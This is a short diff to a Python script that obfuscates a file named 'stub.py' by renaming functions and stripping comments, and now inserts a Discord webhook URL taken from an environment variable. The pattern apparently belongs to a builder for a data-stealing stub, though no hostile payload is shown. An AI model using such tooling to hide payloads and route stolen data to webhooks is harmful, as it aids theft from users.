@@ -1,5 +1,6 @@
 import re
 import random
+import os
 
 def getRandomString() -> str:
     return "".join(random.choices("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ", k= 5))
@@ -17,6 +18,8 @@ with open('stub.py') as in_file:
         obf = re.sub(function_reference.group(2), "", obf)
 
     obf = re.sub(r"#.*\n", "\n", obf)
+
+    obf = obf.replace("%webhook%", os.getenv("DISCORD_WEBHOOK"))
     
     with open('stub.o.py', "w") as out_file:
         out_file.write(obf)
